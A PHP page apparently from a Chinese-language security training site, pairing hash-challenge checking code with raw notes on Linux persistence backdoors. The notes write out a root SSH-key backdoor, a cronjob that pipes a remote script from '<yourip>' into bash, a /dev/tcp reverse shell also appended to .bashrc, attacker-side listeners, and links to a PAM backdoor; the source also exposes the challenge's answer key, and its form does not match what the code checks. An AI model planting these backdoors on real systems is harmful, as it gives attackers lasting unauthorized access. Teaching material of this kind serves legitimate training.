<?php

session_start();
if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: /account/login.php".(isset($_SERVER['REQUEST_URI'])?"?redirect=".$_SERVER['REQUEST_URI']:""));
    exit;
}


require_once("config.php");


if($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["q1-plaintext"]) && isset($_POST["q2-plaintext"]) ){
    $input_q1_plaintext = $_POST["q1-plaintext"];
    $input_q1_algorithm = strtolower($_POST["q1-algorithm"]);
    $input_q2_plaintext = $_POST["q2-plaintext"];
    $input_q2_algorithm = strtolower($_POST["q2-algorithm"]);

    if ($input_q1_plaintext=="secret" && $input_q1_algorithm=="md5" && $input_q2_plaintext=="admin" && $input_q2_algorithm=="sha256") {
        $user_id = $_SESSION["id"];
        $challenges_name = "Cryptography-1-hash";
        include_once('../challenges.php');
        $challenge_array = CheckChallenges($link,$user_id,$challenges_name);
    }else{
        $challenge_array = array('alert',' 答案錯誤');
    
    }
}else if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET["string"])){
    $text = $_GET["string"];
    $textMD5 = md5($text);
    $textSHA256 = hash('sha256', $text);

}
$challenge_type =  $challenge_array[0];
$challenge_messange =  $challenge_array[1];

?>



<?php
  $titlename='Cryptography';
  include_once('../../php-inc/header.php');
?>


<h1></h1>




<h2>Why 維持權限</h2>
<ul>
    <li></li>
    <li>繞過被保護的資料</li>

</ul>


<ul>
    <li>1.ssh 後門</li>

</ul>

ssh 後門
ssh-keygen 
root 密鑰的位置 /root/.ssh
chmod 600 id_rsa
ssh -i id_rsa root@ip

php 後門
/var/www/html

cronjob 後門
cat  /etc/cronjob
* *     * * *   root    curl http://<yourip>:8080/shell | bash

shell 的內容

#!/bin/bash
bash -i >& /dev/tcp/ip/port 0>&1

攻擊機
python3 -m http.server 8080
nc -nvlp <port>


.bashrc 後門
echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc

pam_unix.so
Linux中負責身份驗證的檔案

http: //0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html
https ://github.com/zephrax/linux-pam-backdoor



<h2>小試身手</h2>
<form method="POST" name="form" action="">
    <div class="input-group mb-3">
        <input id="answer" name="answer" type="text" class="form-control" placeholder="回答問題，請一次輸入一個答案" aria-label="回答問題"
            aria-describedby="basic-addon2">
        <div class="input-group-append">
            <button class="btn btn-primary  " type="submit">送出答案</button>
        </div>
    </div>
</form>


<?php
include_once('../../php-inc/footer.php');
?>